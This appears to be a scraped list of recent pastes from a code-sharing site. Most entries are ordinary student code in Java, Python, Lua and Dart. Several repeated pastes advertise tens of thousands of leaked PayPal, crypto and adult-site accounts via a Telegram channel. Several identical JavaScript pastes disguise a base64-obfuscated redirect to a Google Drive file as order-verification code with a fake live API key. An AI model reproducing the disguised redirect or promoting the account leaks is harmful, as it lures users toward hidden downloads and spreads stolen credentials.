id,title,username,language,date,content
VWzTfmd4,[NP] Graduation,dzocesrce,Java,Monday 28th of April 2025 05:39:07 AM CDT,"//package mk.ukim.finki.vtor_kolokvium;

import java.util.*;
import java.util.function.Function;
import java.util.stream.Collectors;
import java.util.stream.IntStream;
import java.util.stream.Collectors;
class OperationNotAllowedException extends Exception{
    public OperationNotAllowedException(String message) {
        super(message);
    }
}
class StudentThree extends Student{
    Map<Integer, List<Course>> coursesByTerm;
    boolean isGraduated;
    public StudentThree(String id) {
        super(id);
        coursesByTerm = new TreeMap<>();
        for(int i=1;i<7;i++)
            coursesByTerm.put(i, new ArrayList<>());
        this.isGraduated = false;
    }

    @Override
    public String getLog() {
        return String.format(""Student with ID %s graduated with average grade %.2f in 3 years."",
                super.getId(),getAverageGrade());
    }

    public boolean isGraduated() {
        return isGraduated;
    }

    public int getNumberOfExamsPassed(){
        return coursesByTerm.values().stream().mapToInt(i->i.size()).sum();
    }

    @Override
    public double getAverageGrade() {
        return coursesByTerm.values().stream().flatMap(list->list.stream()).mapToDouble(i->i.getGrade())
                .average().orElse(5);
    }

    public String getDetailedReport(){
        StringBuilder stringBuilder= new StringBuilder();
        stringBuilder.append(String.format(""Student: %s\n"",super.getId()));
        for(int i=1;i<7;i++){
            stringBuilder.append(String.format(""Term %d\n"",i));
            stringBuilder.append(String.format(""Courses: %d\n"",coursesByTerm.get(i).size()));
            stringBuilder.append(String.format(""Average grade for term: %.2f\n"",
                    coursesByTerm.get(i).stream().mapToDouble(j->j.getGrade()).average().orElse(5.0)));
        }
        stringBuilder.append(String.format(""Average grade: %.2f\n"",getAverageGrade()));
        stringBuilder.append(String.format(""Courses attended: %s\n"",
                coursesByTerm.values().stream().flatMap(list->list.stream()).map(j->j.getName())
                        .sorted(Comparator.naturalOrder()).collect(Collectors.joining("",""))));
        return stringBuilder.toString().trim();
    }

    @Override
    public void addGrade(int term, String courseName, int grade) throws OperationNotAllowedException {
        if(term>6)
            throw new OperationNotAllowedException(String.format
                    (""Term %d is not possible for student with ID %s"",term,super.getId()));
        if(coursesByTerm.containsKey(term)&&coursesByTerm.get(term).size()==3)
            throw new OperationNotAllowedException(String.format
                    (""Student %s already has 3 grades in term %d"",super.getId(),term));
        if(isGraduated){
            return ;
        }

        coursesByTerm.putIfAbsent(term,new ArrayList<>());
        coursesByTerm.get(term).add(new Course(courseName,grade));
        if(getNumberOfExamsPassed()==18)
            isGraduated = true;

    }

    @Override
    public String toString() {
        return String.format(""Student: %s Courses passed: %d Average grade: %.2f"",
                super.getId(),getNumberOfExamsPassed(),getAverageGrade());
    }

    @Override
    public int compareTo(Student o) {
        return Comparator.comparing(Student::getNumberOfExamsPassed,Comparator.reverseOrder())
                .thenComparing(Student::getAverageGrade,Comparator.reverseOrder())
                .thenComparing(Student::getId,Comparator.reverseOrder())
                .compare(this,o);
    }
}

class StudentFour extends Student{
    Map<Integer, List<Course>> coursesByTerm;
    boolean isGraduated;
    public StudentFour(String id) {
        super(id);
        coursesByTerm = new TreeMap<>();
        for(int i=1;i<9;i++)
            coursesByTerm.put(i, new ArrayList<>());
        isGraduated= false;
    }

    @Override
    public String getLog() {
        return String.format(""Student with ID %s graduated with average grade %.2f in 4 years."",
                super.getId(),getAverageGrade());
    }

    @Override
    public boolean isGraduated() {
        return isGraduated;
    }


    public int getNumberOfExamsPassed(){
        return coursesByTerm.values().stream().mapToInt(i->i.size()).sum();
    }

    @Override
    public double getAverageGrade() {
        return coursesByTerm.values().stream().flatMap(list->list.stream()).mapToDouble(i->i.getGrade())
                .average().orElse(5);
    }

    @Override
    public void addGrade(int term, String courseName, int grade) throws OperationNotAllowedException {
        if(term>8)
            throw new OperationNotAllowedException(String.format
                    (""Term %d is not possible for student with ID %s"",term,super.getId()));
        if(coursesByTerm.containsKey(term)&&coursesByTerm.get(term).size()==3)
            throw new OperationNotAllowedException(String.format
                    (""Student %s already has 3 grades in term %d"",super.getId(),term));
        if(isGraduated){
            return ;
        }

        coursesByTerm.putIfAbsent(term,new ArrayList<>());
        coursesByTerm.get(term).add(new Course(courseName,grade));
        if(getNumberOfExamsPassed()==24)
            isGraduated = true;
    }

    @Override
    public int compareTo(Student o) {
        return Comparator.comparing(Student::getNumberOfExamsPassed,Comparator.reverseOrder())
                .thenComparing(Student::getAverageGrade,Comparator.reverseOrder())
                .thenComparing(Student::getId,Comparator.reverseOrder())
                .compare(this,o);
    }


    public String getDetailedReport(){
        StringBuilder stringBuilder= new StringBuilder();
        stringBuilder.append(String.format(""Student: %s\n"",super.getId()));
        for(int i=1;i<9;i++){
            stringBuilder.append(String.format(""Term %d\n"",i));
            stringBuilder.append(String.format(""Courses: %d\n"",coursesByTerm.get(i).size()));
            stringBuilder.append(String.format(""Average grade for term: %.2f\n"",
                    coursesByTerm.get(i).stream().mapToDouble(j->j.getGrade()).average().orElse(5.0)));
        }
        stringBuilder.append(String.format(""Average grade: %.2f\n"",getAverageGrade()));
        stringBuilder.append(String.format(""Courses attended: %s\n"",
                coursesByTerm.values().stream().flatMap(list->list.stream()).map(j->j.getName())
                        .sorted(Comparator.naturalOrder()).collect(Collectors.joining("",""))));
        return stringBuilder.toString().trim();
    }

    @Override
    public String toString() {
        return String.format(""Student: %s Courses passed: %d Average grade: %.2f"",
                super.getId(),getNumberOfExamsPassed(),getAverageGrade());
    }
}

abstract class Student implements Comparable<Student> {
    private String id;

    public Student(String id) {
        this.id = id;
    }

    public String getId() {
        return id;
    }

    public abstract String getLog();

    public abstract boolean isGraduated();

    public abstract String getDetailedReport();

    public abstract int getNumberOfExamsPassed();

    public abstract double getAverageGrade();

    public abstract void addGrade(int term, String courseName, int grade) throws OperationNotAllowedException;
}
class Faculty {
    List<Student> logs;
    Map<String,Student> students;
    Map<String,List<Integer>> studentsOnCourses;
    public Faculty() {
    students= new HashMap<>();
    logs= new ArrayList<>();
    studentsOnCourses= new HashMap<>();
    }

    void addStudent(String id, int yearsOfStudies) {
        if(yearsOfStudies==3)
            students.putIfAbsent(id,(new StudentThree(id)));
        else{
            students.putIfAbsent(id,(new StudentFour(id)));
        }
    }

    void addGradeToStudent(String studentId, int term, String courseName, int grade) throws OperationNotAllowedException {
        students.get(studentId).addGrade(term,courseName,grade);
        studentsOnCourses.putIfAbsent(courseName,new ArrayList<>());
        studentsOnCourses.get(courseName).add(grade);

    }


    String getFacultyLogs() {

        logs = students.values().stream().filter(i->i.isGraduated()).collect(Collectors.toList());
        students= students.values().stream().filter(i->!i.isGraduated()).collect(Collectors.toMap(
                value->value.getId(),
                value->value
        ));
        return logs.stream().sorted(Comparator.comparing(Student::getId))
                .map(i-> i.getLog()).collect(Collectors.joining(""\n""));
    }

    String getDetailedReportForStudent(String id) {
        return students.get(id).getDetailedReport();

    }

    void printFirstNStudents(int n) {
        students.values().stream().sorted().limit(n).forEach(System.out::println);

    }
    void printCourses() {
        studentsOnCourses.entrySet().stream().sorted(Comparator
                        .comparing((Map.Entry<String, List<Integer>> entry) ->
                                        entry.getValue().size(),Comparator.naturalOrder())
                        .thenComparing(entry ->
                                entry.getValue().stream().mapToDouble(j->j)
                                        .average().orElse(5.0),Comparator.naturalOrder())
                        .thenComparing(entry->entry.getKey()))

                .forEach(i-> System.out.println(String.format(""%s %d %.2f"",
                        i.getKey(),i.getValue().size(),
                        i.getValue().stream().mapToDouble(j->j).average().orElse(5.0))));

    }
}


class Course {
    String name;
    int grade;

    public Course(String name, int grade) {
        this.name = name;
        this.grade = grade;
    }

    public String getName() {
        return name;
    }

    public int getGrade() {
        return grade;
    }
}


public class FacultyTest {

    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);
        int testCase = sc.nextInt();

        if (testCase == 1) {
            System.out.println(""TESTING addStudent AND printFirstNStudents"");
            Faculty faculty = new Faculty();
            for (int i = 0; i < 10; i++) {
                faculty.addStudent(""student"" + i, (i % 2 == 0) ? 3 : 4);
            }
            faculty.printFirstNStudents(10);

        } else if (testCase == 2) {
            System.out.println(""TESTING addGrade and exception"");
            Faculty faculty = new Faculty();
            faculty.addStudent(""123"", 3);
            faculty.addStudent(""1234"", 4);
            try {
                faculty.addGradeToStudent(""123"", 7, ""NP"", 10);
            } catch (OperationNotAllowedException e) {
                System.out.println(e.getMessage());
            }
            try {
                faculty.addGradeToStudent(""1234"", 9, ""NP"", 8);
            } catch (OperationNotAllowedException e) {
                System.out.println(e.getMessage());
            }
        } else if (testCase == 3) {
            System.out.println(""TESTING addGrade and exception"");
            Faculty faculty = new Faculty();
            faculty.addStudent(""123"", 3);
            faculty.addStudent(""1234"", 4);
            for (int i = 0; i < 4; i++) {
                try {
                    faculty.addGradeToStudent(""123"", 1, ""course"" + i, 10);
                } catch (OperationNotAllowedException e) {
                    System.out.println(e.getMessage());
                }
            }
            for (int i = 0; i < 4; i++) {
                try {
                    faculty.addGradeToStudent(""1234"", 1, ""course"" + i, 10);
                } catch (OperationNotAllowedException e) {
                    System.out.println(e.getMessage());
                }
            }
        } else if (testCase == 4) {
            System.out.println(""Testing addGrade for graduation"");
            Faculty faculty = new Faculty();
            faculty.addStudent(""123"", 3);
            faculty.addStudent(""1234"", 4);
            int counter = 1;
            for (int i = 1; i <= 6; i++) {
                for (int j = 1; j <= 3; j++) {
                    try {
                        faculty.addGradeToStudent(""123"", i, ""course"" + counter, (i % 2 == 0) ? 7 : 8);
                    } catch (OperationNotAllowedException e) {
                        System.out.println(e.getMessage());
                    }
                    ++counter;
                }
            }
            counter = 1;
            for (int i = 1; i <= 8; i++) {
                for (int j = 1; j <= 3; j++) {
                    try {
                        faculty.addGradeToStudent(""1234"", i, ""course"" + counter, (j % 2 == 0) ? 7 : 10);
                    } catch (OperationNotAllowedException e) {
                        System.out.println(e.getMessage());
                    }
                    ++counter;
                }
            }
            System.out.println(""LOGS"");
            System.out.println(faculty.getFacultyLogs());
            System.out.println(""PRINT STUDENTS (there shouldn't be anything after this line!"");
            faculty.printFirstNStudents(2);
        } else if (testCase == 5 || testCase == 6 || testCase == 7) {
            System.out.println(""Testing addGrade and printFirstNStudents (not graduated student)"");
            Faculty faculty = new Faculty();
            for (int i = 1; i <= 10; i++) {
                faculty.addStudent(""student"" + i, ((i % 2) == 1 ? 3 : 4));
                int courseCounter = 1;
                for (int j = 1; j < ((i % 2 == 1) ? 6 : 8); j++) {
                    for (int k = 1; k <= ((j % 2 == 1) ? 3 : 2); k++) {
                        try {
                            faculty.addGradeToStudent(""student"" + i, j, (""course"" + courseCounter), i % 5 + 6);
                        } catch (OperationNotAllowedException e) {
                            System.out.println(e.getMessage());
                        }
                        ++courseCounter;
                    }
                }
            }
            if (testCase == 5)
                faculty.printFirstNStudents(10);
            else if (testCase == 6)
                faculty.printFirstNStudents(3);
            else
                faculty.printFirstNStudents(20);
        } else if (testCase == 8 || testCase == 9) {
            System.out.println(""TESTING DETAILED REPORT"");
            Faculty faculty = new Faculty();
            faculty.addStudent(""student1"", ((testCase == 8) ? 3 : 4));
            int grade = 6;
            int counterCounter = 1;
            for (int i = 1; i < ((testCase == 8) ? 6 : 8); i++) {
                for (int j = 1; j < 3; j++) {
                    try {
                        faculty.addGradeToStudent(""student1"", i, ""course"" + counterCounter, grade);
                    } catch (OperationNotAllowedException e) {
                        e.printStackTrace();
                    }
                    grade++;
                    if (grade == 10)
                        grade = 5;
                    ++counterCounter;
                }
            }
            System.out.println(faculty.getDetailedReportForStudent(""student1""));
        } else if (testCase==10) {
            System.out.println(""TESTING PRINT COURSES"");
            Faculty faculty = new Faculty();
            for (int i = 1; i <= 10; i++) {
                faculty.addStudent(""student"" + i, ((i % 2) == 1 ? 3 : 4));
                int courseCounter = 1;
                for (int j = 1; j < ((i % 2 == 1) ? 6 : 8); j++) {
                    for (int k = 1; k <= ((j % 2 == 1) ? 3 : 2); k++) {
                        int grade = sc.nextInt();
                        try {
                            faculty.addGradeToStudent(""student"" + i, j, (""course"" + courseCounter), grade);
                        } catch (OperationNotAllowedException e) {
                            System.out.println(e.getMessage());
                        }
                        ++courseCounter;
                    }
                }
            }
            faculty.printCourses();
        } else if (testCase==11) {
            System.out.println(""INTEGRATION TEST"");
            Faculty faculty = new Faculty();
            for (int i = 1; i <= 10; i++) {
                faculty.addStudent(""student"" + i, ((i % 2) == 1 ? 3 : 4));
                int courseCounter = 1;
                for (int j = 1; j <= ((i % 2 == 1) ? 6 : 8); j++) {
                    for (int k = 1; k <= ((j % 2 == 1) ? 2 : 3); k++) {
                        int grade = sc.nextInt();
                        try {
                            faculty.addGradeToStudent(""student"" + i, j, (""course"" + courseCounter), grade);
                        } catch (OperationNotAllowedException e) {
                            System.out.println(e.getMessage());
                        }
                        ++courseCounter;
                    }
                }

            }

            for (int i=11;i<15;i++) {
                faculty.addStudent(""student"" + i, ((i % 2) == 1 ? 3 : 4));
                int courseCounter = 1;
                for (int j = 1; j <= ((i % 2 == 1) ? 6 : 8); j++) {
                    for (int k = 1; k <= 3; k++) {
                        int grade = sc.nextInt();
                        try {
                            faculty.addGradeToStudent(""student"" + i, j, (""course"" + courseCounter), grade);
                        } catch (OperationNotAllowedException e) {
                            System.out.println(e.getMessage());
                        }
                        ++courseCounter;
                    }
                }
            }
            System.out.println(""LOGS"");
            System.out.println(faculty.getFacultyLogs());
            System.out.println(""DETAILED REPORT FOR STUDENT"");
            System.out.println(faculty.getDetailedReportForStudent(""student2""));
            try {
                System.out.println(faculty.getDetailedReportForStudent(""student11""));
                System.out.println(""The graduated students should be deleted!!!"");
            } catch (NullPointerException e) {
                System.out.println(""The graduated students are really deleted"");
            }
            System.out.println(""FIRST N STUDENTS"");
            faculty.printFirstNStudents(10);
            System.out.println(""COURSES"");
            faculty.printCourses();
        }
    }
}
"
Q91tZutA,Crypto Accounts,iLoveToWatch,JavaScript,Monday 28th of April 2025 05:30:09 AM CDT,79312 Accounts Posted On https://t.me/leakedbyem1nem
F7Xvhehu,Untitled,luqlegal,JavaScript,Monday 28th of April 2025 05:28:40 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/40194/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zqPyyJVW,PayPal with Balance,iLoveToWatch,JavaScript,Monday 28th of April 2025 05:14:47 AM CDT,26508 Accounts Posted On https://t.me/leakedbyem1nem
3JApTsfE,Products.js,luqlegal,JavaScript,Monday 28th of April 2025 05:13:18 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/46354/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BbgPE1Yy,random password generator,BojidarDosev,Python,Monday 28th of April 2025 05:08:27 AM CDT,"import random
import string

list = """"
br1 = int(20)
while br1>0:
    randnum = random.randint(0, 9)
    randstr = random.choice(string.ascii_letters)
    randsymbol = random.choice(string.punctuation)
    randnum3 = random.randint(1,3)
    if randnum3==1:
        list += str(randnum)
    elif randnum3==2:
        list += randstr
    else:
        list += randsymbol
    br1-=1
print(list)
"
rHtTeN2r,Leaked Accounts - Fresh Hits,iLoveToWatch,JavaScript,Monday 28th of April 2025 04:59:26 AM CDT,57737 Accounts Posted On https://t.me/leakedbyem1nem
bSHpeuqW,23401,boyan1324,Python,Monday 28th of April 2025 04:58:04 AM CDT,"# 1
num1, num2 = input().split(', ')
num1, num2 = num1, num2
try:
    print(int(num1) / int(num2))
except ZeroDivisionError:
    print(""You cannot divide by zero"")
except ValueError:
    print(""You cannot divide by symbol"")

# 2
numbers = [int(x) if x.isnumeric() else str(x) for x in input().split()]
try:
    if numbers:
        print(sum(numbers))
    else:
        print(""You cannot sum empty list!"")
except TypeError:
    print(""You can not sum int and str"")

# 3
number = input()
try:
    result = int(float(number))
    print(result)
except ValueError:
    print(""You can not make string to integer"")

# 4
data = input().split()
people = {}
for i in range(0, len(data), 2):
    name = data[i]
    age = int(data[i+1])
    people[name] = age
names_to_check = input().replace("" "", """").split("","")
results = []
try:
    for name in names_to_check:
        if name in people:
            results.append(str(people[name]))
        else:
            raise KeyError
    print("", "".join(results))
    print(""Those were ages of the people"")
except KeyError:
    print(""This person does not exist in this dictionary"")

# 5
data = input().split()
people = {}
for i in range(0, len(data), 2):
    name = data[i]
    age = int(data[i+1])
    people[name] = age
names_to_check = input().replace("" "", """").split("","")
people_list = list(people.keys())
results = []
try:
    for name in names_to_check:
        if name in people_list:
            results.append(name)
        else:
            raise KeyError
    print("", "".join(results))
    print(""Deletion was successful"")
except KeyError:
    print(""Element is not in the list"")
print(""This is my program"")
"
AEG5HvmS,Order.js,luqlegal,JavaScript,Monday 28th of April 2025 04:57:57 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/21560/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
6W4ZdnR5,rand num guesser,BojidarDosev,Python,Monday 28th of April 2025 04:56:52 AM CDT,"import random

num = random.randint(1,100)
userinp = int(input(""Enter a number between 1 and 100: ""))
br = 1;
while userinp != num:
    br=br+1
    if userinp > num:
        print(""Too big"")
    elif userinp < num:
        print(""Too small"")
    userinp = int(input(""Enter a number between 1 and 100: ""))

print(""You guessed it! The number was"", num)
print(""It took you "" , br , "" tries!"")"
Qu03kjEh,Untitled,kkbr11022,Lua,Monday 28th of April 2025 04:55:59 AM CDT,"local hax = script.Parent
local Face = hax.Face
local Audio = Face.Audio
--local Output = Face.Output
--local Wire = Face.Wire
--Wire.SourceInstance = Audio
--Wire.TargetInstance = Output
local Image = Face.Image
local Click = Face.Click

local Length = Audio.TimeLength
local Seq = NumberSequence.new(0, Length)
local Count = Length*10
local Playing = false
function Play()
  if Playing ~= false then return end
  assert(Audio.Asset, `Audio ""{Audio.Asset}"" is nil`)
  assert(Audio.IsReady, `Audio ""{Audio.Asset}"" is not ready.`)
  Playing=true
  local Before = Face.Size
  local function clp(x)
    return math.clamp(x, 0.05, 1)
  end
  Click:Remove()
  local Waves = Audio:GetWaveformAsync(Seq, Count)
  Audio:Play()
  for _, i in pairs(Waves) do
    local Speed = Audio.PlaybackSpeed
    local Volume = math.clamp(Audio.Volume, 0, 3)
    local Time = (Length/Count)/Speed
    i=i*10
    if i<0.2 then i=0 end
    local X,Y,Z=clp(i), clp(i), Before.Z
    Face.Size = Before+Vector3.new(X*Volume,Y*Volume,Z)
    if Time==0 then continue end
    wait(Time)
  end
  Face.Size = Before
  Audio:Stop()
  Playing=false
  Click.Parent=Face
end

Click.MouseClick:Connect(Play)"
iGziPdjq,pass parameter flutter bundle constractor,muhaiminurabir,Dart,Monday 28th of April 2025 04:47:48 AM CDT,"//sending
Navigator.pushNamed(
                      context,
                      howItWorksYoutube,
                      arguments: {
                        'tittle': CustomStrings.howItWorks,
                        'url':
                            context
                                .read<HomeProvider>()
                                .homeResponse!
                                .howItWorks!,
                      },
                    );
//from main page
howItWorksYoutube:
                (context) => YoutubeScreen(
                  args: ModalRoute.of(context)!.settings.arguments as Map,
                ),

//getting
class YoutubeScreen extends StatelessWidget {
  final Map args;

  const YoutubeScreen({super.key, required this.args});

  @override
  Widget build(BuildContext context) {
    YoutubePlayerController _controller = YoutubePlayerController(
      initialVideoId: args[""url""],
      flags: YoutubePlayerFlags(autoPlay: true, mute: false),
    );

    return Scaffold(
      appBar: PreferredSize(
        preferredSize: const Size.fromHeight(kToolbarHeight), // Set
        child: CustomAppBar(
          title: args[""tittle""],
          color: Colors.white,
          onTap: () {
            Navigator.of(context).pop();
          },
        ),
      ),
      body: YoutubePlayerBuilder(
        player: YoutubePlayer(controller: _controller),
        builder: (context, player) {
          return Column(children: [player]);
        },
      ),
    );
  }
}
"
jZyKMvUK,Chaturbate with Tokens,iLoveToWatch,JavaScript,Monday 28th of April 2025 04:44:04 AM CDT,26767 Accounts Posted On https://t.me/leakedbyem1nem
0H4PMS01,Market.js,luqlegal,JavaScript,Monday 28th of April 2025 04:42:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/65326/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Nz2NBPq8,Crypto Accounts,iLoveToWatch,JavaScript,Monday 28th of April 2025 04:28:43 AM CDT,15676 Accounts Posted On https://t.me/leakedbyem1nem
Tk81Pbii,Untitled,luqlegal,JavaScript,Monday 28th of April 2025 04:27:13 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/00338/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
3nhsxZpq,23401,boyan1324,Python,Monday 28th of April 2025 04:24:54 AM CDT,"# 1
num1, num2 = input().split(',')
num1, num2 = num1, num2
try:
    print(int(num1) / int(num2))
except ZeroDivisionError:
    print(""You cannot divide by zero"")
except ValueError:
    print(""You cannot divide by symbol"")

# 2
numbers = [int(x) if x.isnumeric() else str(x) for x in input().split()]
try:
    print(sum(numbers))
except TypeError:
    print(""You can not add symbol"")

# 3
numbers = [int(x) for x in input().split(',')]
target = input()
try:
    print(numbers[int(target)])
except IndexError:
    print('Index out of range')
except ValueError:
    print('Invalid index')

# 4
from numpy import sqrt
number = input()
try:
    if int(number) >= 0:
        print(sqrt(int(number)))
    else:
        print(""Cannot calculate square root of negative number"")
except ValueError:
    print(""Invalid input"")

# 5
num1, num2 = input().split(',')
try:
    print(int(num1) % int(num2))
except ZeroDivisionError:
    print(""You can not divide by ZERO"")
except ValueError:
    print(""Invalid input"")

# 6
number = input()
try:
    print(int(number))
except ValueError:
    print(""Conversion Error"")

# 7
num1, num2 = input().split(',')
try:
    print(int(num1) - int(num2))
except ValueError:
    print(""Invalid input"")

# 8
n = int(input())
my_dict = {}
for i in range(2):
    key, value = input().split(',')
    my_dict[key] = int(value)
target = input()
try:
    print(my_dict[target])
except KeyError:
    print(""Key not found"")

# 9
num1, num2 = input().split(',')
try:
    print(int(num1) + int(num2))
except ValueError:
    print(""Invalid input"")"
DuWH27bk,PayPal with Balance,iLoveToWatch,JavaScript,Monday 28th of April 2025 04:13:22 AM CDT,49736 Accounts Posted On https://t.me/leakedbyem1nem
